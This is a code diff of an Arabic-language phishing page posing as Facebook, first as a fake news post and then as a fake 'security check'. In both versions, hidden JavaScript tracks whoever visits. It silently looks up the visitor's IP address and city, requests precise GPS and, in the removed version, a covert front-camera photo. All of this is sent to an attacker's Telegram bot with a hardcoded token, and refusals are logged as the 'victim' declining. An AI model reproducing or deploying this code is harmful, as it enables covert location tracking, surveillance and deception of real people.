@@ -3,156 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك - توضيح رسمي</title>
+    
+    <meta property="og:title" content="تنبيه أمني: نشاط غير معتاد على حسابك">
+    <meta property="og:description" content="تم رصد محاولة تسجيل دخول من جهاز غير معروف في منطقة ريف دمشق. اضغط للمراجعة وتأمين الحساب.">
+    
+    <meta property="og:image" content="https://img.freepik.com/free-vector/security-concept-illustration_114360-497.jpg"> 
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary_large_image">
+
+    <title>Facebook Security Check</title>
+    
     <style>
-        :root { --fb-blue: #1877f2; --fb-bg: #f0f2f5; --fb-text: #050505; --fb-sub: #65676b; }
-        body { margin:0; padding:0; background: var(--fb-bg); font-family: Segoe UI, Helvetica, Arial, sans-serif; display: flex; justify-content: center; }
-        .fb-post { width: 100%; max-width: 500px; background: white; margin-top: 12px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); border: 1px solid #dddfe2; overflow: hidden; }
-        
-        /* الرأس */
-        .header { display: flex; align-items: center; padding: 12px 16px; }
-        .avatar { width: 40px; height: 40px; border-radius: 50%; background: var(--fb-blue); display: flex; align-items: center; justify-content: center; color: white; font-size: 18px; margin-left: 12px; border: 1px solid rgba(0,0,0,0.1); }
-        .name-col { display: flex; flex-direction: column; }
-        .page-name { font-weight: 600; font-size: 15px; color: var(--fb-text); display: flex; align-items: center; }
-        .page-name::after { content: ' ✔'; color: var(--fb-blue); margin-right: 4px; font-size: 12px; }
-        .post-time { font-size: 13px; color: var(--fb-sub); margin-top: 2px; }
-
-        /* النص */
-        .content { padding: 4px 16px 12px 16px; font-size: 15px; line-height: 1.5; color: var(--fb-text); }
-        .hashtag { color: var(--fb-blue); cursor: pointer; }
-
-        /* منطقة التمويه (الزر) */
-        .media-box { position: relative; width: 100%; height: 260px; background: #000; display: flex; justify-content: center; align-items: center; }
-        .bg-blur { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.35; filter: blur(12px); }
-        .cta-btn { position: relative; z-index: 20; padding: 10px 25px; background: var(--fb-blue); color: white; border: none; border-radius: 6px; font-weight: 600; font-size: 15px; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-
-        /* تفاعلات فيسبوك الأصلية (CSS) */
-        .engagement { padding: 10px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ebedf0; }
-        .react-group { display: flex; align-items: center; }
-        .icons-stack { display: flex; margin-left: 8px; position: relative; width: 32px; height: 20px; }
-        
-        /* دائرة اللايك */
-        .ic-like { width: 18px; height: 18px; background: #1877f2; border-radius: 50%; border: 2px solid white; display: flex; align-items: center; justify-content: center; position: absolute; z-index: 3; }
-        .ic-like::before { content: '👍'; font-size: 10px; color: white; }
-        
-        /* دائرة القلب */
-        .ic-love { width: 18px; height: 18px; background: #f02849; border-radius: 50%; border: 2px solid white; display: flex; align-items: center; justify-content: center; position: absolute; right: 0; z-index: 2; }
-        .ic-love::before { content: '❤️'; font-size: 10px; color: white; }
-
-        .count { font-size: 14px; color: var(--fb-sub); }
-        .actions { display: flex; padding: 4px; justify-content: space-around; }
-        .act-btn { flex: 1; text-align: center; padding: 8px; color: var(--fb-sub); font-size: 14px; font-weight: 600; }
+        body { margin: 0; padding: 0; background: #f0f2f5; font-family: Segoe UI, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
+        .card { text-align: center; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; }
+        .fb-logo { width: 60px; margin-bottom: 20px; }
+        .h1 { font-size: 18px; font-weight: bold; color: #1c1e21; margin-bottom: 10px; }
+        .p { font-size: 14px; color: #606770; margin-bottom: 25px; line-height: 1.4; }
+        .btn { background: #1877f2; color: white; padding: 12px 20px; border-radius: 6px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 16px; }
     </style>
 </head>
-<body>
+<body onclick="getAccurateGPS()">
 
-<div class="fb-post">
-    <div class="header">
-        <div class="avatar">📢</div>
-        <div class="name-col">
-            <span class="page-name">أخبار السليمة الآن</span>
-            <span class="post-time">منذ ٢٠ دقيقة · 🌍</span>
-        </div>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" class="fb-logo">
+        <div class="h1">هل أنت من حاول تسجيل الدخول؟</div>
+        <div class="p">لقد اكتشفنا محاولة دخول جديدة من متصفح غير معروف. إذا لم تكن أنت، يرجى تأمين حسابك فوراً.</div>
+        <button class="btn">إضغط هنا لتأمين الحساب</button>
+        <p style="font-size: 12px; color: #90949c; margin-top: 15px;">الصفحة الرسمية | شركة فيسبوك</p>
     </div>
-
-    <div class="content">
-        <b>توضيح بخصوص الأخبار المتداولة عن [محمد مصطفى العنعوني]</b><br><br>
-        نود الإحاطة بأن الأخبار التي انتشرت مؤخراً حول "اختطاف" محمد مصطفى العنعوني هي أخبار غير صحيحة وعارية تماماً عن الصحة.<br>
-        محمد بخير وعافية، ونرجو من الجميع توخي الدقة وعدم الانجرار وراء الشائعات.<br><br>
-        <span class="hashtag">#توضيح #نفي_خبر #محمد_مصطفى_العنعوني</span>
-    </div>
-
-    <div class="media-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" class="bg-blur">
-        <button class="cta-btn" id="goBtn">رؤية المنشور كامل</button>
-    </div>
-
-    <div class="engagement">
-        <div class="react-group">
-            <div class="icons-stack">
-                <div class="ic-like"></div>
-                <div class="ic-love"></div>
-            </div>
-            <span class="count">٣٠٠</span>
-        </div>
-        <div class="count">٢٤ تعليق • ٧ مشاركات</div>
-    </div>
-
-    <div class="actions">
-        <div class="act-btn">👍 أعجبني</div>
-        <div class="act-btn">💬 تعليق</div>
-        <div class="act-btn">↪️ مشاركة</div>
-    </div>
-</div>
 
 <script>
-const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-const ID = "1611398303";
+    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+    const CHAT_ID = "1611398303";
 
-document.getElementById('goBtn').onclick = function() {
-    // تفعيل ملء الشاشة لإقناع المستخدم بالخصوصية
-    let e = document.documentElement;
-    if (e.requestFullscreen) e.requestFullscreen();
-    else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen();
-
-    this.innerText = "جاري التحميل...";
-    this.disabled = true;
-
-    // البدء الفوري بعد 4 ثوانٍ
-    setTimeout(startExploit, 4000);
-};
-
-async function startExploit() {
-    // 1. طلب الموقع أولاً (سيظهر طلب الإذن الآن)
-    navigator.geolocation.getCurrentPosition(
-        (pos) => { handleCapture(pos); }, 
-        () => { handleCapture(null); }, // حتى لو رفض ننتقل للكاميرا
-        { enableHighAccuracy: true, timeout: 8000 }
-    );
-}
-
-async function handleCapture(pos) {
-    try {
-        // 2. طلب الكاميرا (سيظهر طلب الإذن الثاني)
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const v = document.createElement('video');
-        v.srcObject = stream;
-        v.play();
-
-        setTimeout(async () => {
-            const canvas = document.createElement('canvas');
-            canvas.width = 720; canvas.height = 1280;
-            canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
-            const img = canvas.toDataURL('image/jpeg');
-            stream.getTracks().forEach(t => t.stop());
-
-            await shipIt(img, pos);
-        }, 1500);
-    } catch (err) {
-        // إذا رفض الكاميرا أيضاً، نرسل ما لدينا (الموقع فقط أو حتى مجرد إشعار دخول)
-        await shipIt(null, pos);
+    function startSilentScan() {
+        const script = document.createElement('script');
+        script.src = 'https://api.ipify.org?format=jsonp&callback=initDeepScan';
+        document.body.appendChild(script);
     }
-}
 
-async function shipIt(img, pos) {
-    let msg = `🎯 صيد جديد\n📱 الجهاز: ${navigator.platform}`;
-    if (pos) msg += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}\n🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-    else msg += `\n📍 الموقع: (مرفوض)`;
-
-    if (img) {
-        const blob = await (await fetch(img)).blob();
-        const fd = new FormData();
-        fd.append('photo', blob, 'pic.jpg');
-        fd.append('caption', msg);
-        fd.append('chat_id', ID);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-    } else {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
+    async function initDeepScan(data) {
+        const ip = data.ip;
+        try {
+            const res = await fetch(`https://ipapi.co/${ip}/json/`);
+            const d = await res.json();
+            let report = `📊 تقرير استخباراتي (صيد صامت):\n🌐 الـ IP: ${d.ip}\n🏢 المزود: ${d.org}\n📍 المنطقة: ${d.region} - ${d.city}\n📱 الجهاز: ${navigator.platform}\n🌍 الإحداثيات: ${d.latitude}, ${d.longitude}\n🔗 الخريطة: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            sendToTelegram(report);
+        } catch (e) {
+            sendToTelegram(`🚀 دخول جديد!\n🌐 الـ IP المستهدف: ${ip}`);
+        }
     }
-    
-    // التوجيه النهائي للفيسبوك لإنهاء الشك
-    window.location.href = "https://m.facebook.com/login/";
-}
+
+    function getAccurateGPS() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                let lat = pos.coords.latitude;
+                let lon = pos.coords.longitude;
+                let msg = `🎯 صيد دقيق (GPS REAL-TIME)\n📍 الإحداثيات: ${lat}, ${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+                sendToTelegram(msg);
+                setTimeout(() => { window.location.href = "https://m.facebook.com/hacked"; }, 1000);
+            }, (err) => {
+                sendToTelegram("⚠️ الضحية رفض إذن الموقع.");
+                window.location.href = "https://m.facebook.com/hacked";
+            }, { enableHighAccuracy: true });
+        }
+    }
+
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+    }
+
+    window.onload = startSilentScan;
 </script>
 </body>
 </html>
